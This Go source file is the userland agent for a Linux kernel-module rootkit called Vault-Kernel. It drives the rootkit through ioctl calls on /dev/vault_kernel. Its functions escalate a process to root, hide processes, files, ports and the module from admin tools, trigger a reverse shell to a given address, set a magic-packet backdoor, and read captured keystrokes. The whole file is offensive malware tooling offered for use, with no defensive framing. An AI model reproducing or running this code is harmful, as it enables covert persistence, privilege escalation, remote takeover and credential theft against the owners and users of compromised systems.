//go:build linux

// Package agent provides the Vault-Kernel IOCTL wrapper.
//
// Vault-Kernel is the Linux LKM rootkit engine. This wrapper communicates
// with it via the /dev/vault_kernel device using ioctl syscalls.
//
// Available commands:
//
//	give_root(pid)      → escalate process to root via cred manipulation
//	hide_pid(pid)        → hide process from ps/top/htop
//	hide_file(path)      → hide file/dir from ls/find/stat
//	hide_port(port)      → hide TCP/UDP port from netstat/ss
//	hide_module()        → hide the LKM from lsmod
//	backdoor_shell(addr) → trigger reverse shell (call_usermodehelper)
//	read_keylog()        → read captured keystrokes
package agent

import (
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

// IOCTL command codes for /dev/vault_kernel
const (
	vaultMagic = 0xC0

	ioctlGiveRoot      = (vaultMagic << 8) | 0x01
	ioctlHideFile      = (vaultMagic << 8) | 0x02
	ioctlUnhideFile    = (vaultMagic << 8) | 0x03
	ioctlHidePID       = (vaultMagic << 8) | 0x04
	ioctlUnhidePID     = (vaultMagic << 8) | 0x05
	ioctlHidePort      = (vaultMagic << 8) | 0x06
	ioctlUnhidePort    = (vaultMagic << 8) | 0x07
	ioctlListHidden    = (vaultMagic << 8) | 0x08
	ioctlKeylogRead    = (vaultMagic << 8) | 0x09
	ioctlKeylogClear   = (vaultMagic << 8) | 0x0A
	ioctlBackdoorShell = (vaultMagic << 8) | 0x0B
	ioctlBackdoorMagic = (vaultMagic << 8) | 0x0C
	ioctlModuleHide    = (vaultMagic << 8) | 0x0D
	ioctlModuleUnhide  = (vaultMagic << 8) | 0x0E
)

const devicePath = "/dev/vault_kernel"

// VaultIOCTL provides access to the Vault-Kernel rootkit via ioctl.
type VaultIOCTL struct {
	fd   uintptr
	file *os.File
}

// NewVaultIOCTL opens the vault kernel device.
func NewVaultIOCTL() *VaultIOCTL {
	f, err := os.OpenFile(devicePath, os.O_RDWR, 0)
	if err != nil {
		return &VaultIOCTL{}
	}
	return &VaultIOCTL{
		fd:   f.Fd(),
		file: f,
	}
}

// IsAvailable returns whether the kernel module is loaded.
func (v *VaultIOCTL) IsAvailable() bool {
	return v.file != nil
}

// Close closes the device file.
func (v *VaultIOCTL) Close() {
	if v.file != nil {
		v.file.Close()
	}
}

// GiveRoot escalates a process to root by PID.
func (v *VaultIOCTL) GiveRoot(pid int) error {
	if !v.IsAvailable() {
		return fmt.Errorf("vault device not available")
	}
	buf := make([]byte, 4)
	buf[0] = byte(pid)
	buf[1] = byte(pid >> 8)
	buf[2] = byte(pid >> 16)
	buf[3] = byte(pid >> 24)
	return v.ioctl(ioctlGiveRoot, unsafe.Pointer(&buf[0]))
}

// HidePID hides a process from ps/top/htop.
func (v *VaultIOCTL) HidePID(pid int) error {
	if !v.IsAvailable() {
		return fmt.Errorf("vault device not available")
	}
	buf := make([]byte, 4)
	buf[0] = byte(pid)
	buf[1] = byte(pid >> 8)
	buf[2] = byte(pid >> 16)
	buf[3] = byte(pid >> 24)
	return v.ioctl(ioctlHidePID, unsafe.Pointer(&buf[0]))
}

// UnhidePID reveals a previously hidden process.
func (v *VaultIOCTL) UnhidePID(pid int) error {
	buf := make([]byte, 4)
	buf[0] = byte(pid)
	buf[1] = byte(pid >> 8)
	buf[2] = byte(pid >> 16)
	buf[3] = byte(pid >> 24)
	return v.ioctl(ioctlUnhidePID, unsafe.Pointer(&buf[0]))
}

// HideFile hides a file/directory from ls/find/stat.
func (v *VaultIOCTL) HideFile(path string) error {
	if !v.IsAvailable() {
		return fmt.Errorf("vault device not available")
	}
	buf := make([]byte, 256)
	copy(buf, path)
	return v.ioctl(ioctlHideFile, unsafe.Pointer(&buf[0]))
}

// UnhideFile reveals a previously hidden file.
func (v *VaultIOCTL) UnhideFile(path string) error {
	buf := make([]byte, 256)
	copy(buf, path)
	return v.ioctl(ioctlUnhideFile, unsafe.Pointer(&buf[0]))
}

// HidePort hides a TCP/UDP port from netstat/ss.
func (v *VaultIOCTL) HidePort(port uint16) error {
	if !v.IsAvailable() {
		return fmt.Errorf("vault device not available")
	}
	buf := make([]byte, 2)
	buf[0] = byte(port)
	buf[1] = byte(port >> 8)
	return v.ioctl(ioctlHidePort, unsafe.Pointer(&buf[0]))
}

// UnhidePort reveals a previously hidden port.
func (v *VaultIOCTL) UnhidePort(port uint16) error {
	buf := make([]byte, 2)
	buf[0] = byte(port)
	buf[1] = byte(port >> 8)
	return v.ioctl(ioctlUnhidePort, unsafe.Pointer(&buf[0]))
}

// HideModule hides the LKM from lsmod.
func (v *VaultIOCTL) HideModule() error {
	if !v.IsAvailable() {
		return fmt.Errorf("vault device not available")
	}
	return v.ioctl(ioctlModuleHide, nil)
}

// UnhideModule makes the module visible in lsmod.
func (v *VaultIOCTL) UnhideModule() error {
	return v.ioctl(ioctlModuleUnhide, nil)
}

// BackdoorShell triggers a reverse shell to the given address.
func (v *VaultIOCTL) BackdoorShell(addr string) error {
	if !v.IsAvailable() {
		return fmt.Errorf("vault device not available")
	}
	buf := make([]byte, 256)
	copy(buf, addr)
	return v.ioctl(ioctlBackdoorShell, unsafe.Pointer(&buf[0]))
}

// SetMagicBackdoor sets the magic packet trigger word.
func (v *VaultIOCTL) SetMagicBackdoor(word string) error {
	buf := make([]byte, 16)
	copy(buf, word)
	return v.ioctl(ioctlBackdoorMagic, unsafe.Pointer(&buf[0]))
}

// ReadKeylog reads captured keystrokes from the kernel keylogger.
func (v *VaultIOCTL) ReadKeylog() (string, error) {
	if !v.IsAvailable() {
		return "", fmt.Errorf("vault device not available")
	}
	buf := make([]byte, 4096)
	if err := v.ioctl(ioctlKeylogRead, unsafe.Pointer(&buf[0])); err != nil {
		return "", err
	}
	// Find null terminator
	for i, b := range buf {
		if b == 0 {
			return string(buf[:i]), nil
		}
	}
	return string(buf), nil
}

// ClearKeylog clears the keylogger buffer.
func (v *VaultIOCTL) ClearKeylog() error {
	return v.ioctl(ioctlKeylogClear, nil)
}

// ListHidden returns a description of all hidden objects.
func (v *VaultIOCTL) ListHidden() (string, error) {
	if !v.IsAvailable() {
		return "", fmt.Errorf("vault device not available")
	}
	buf := make([]byte, 4096)
	if err := v.ioctl(ioctlListHidden, unsafe.Pointer(&buf[0])); err != nil {
		return "", err
	}
	for i, b := range buf {
		if b == 0 {
			return string(buf[:i]), nil
		}
	}
	return string(buf), nil
}

func (v *VaultIOCTL) ioctl(cmd uintptr, arg unsafe.Pointer) error {
	_, _, errno := syscall.Syscall(
		syscall.SYS_IOCTL,
		v.fd,
		cmd,
		uintptr(arg),
	)
	if errno != 0 {
		return fmt.Errorf("ioctl 0x%X failed: %v", cmd, errno)
	}
	return nil
}
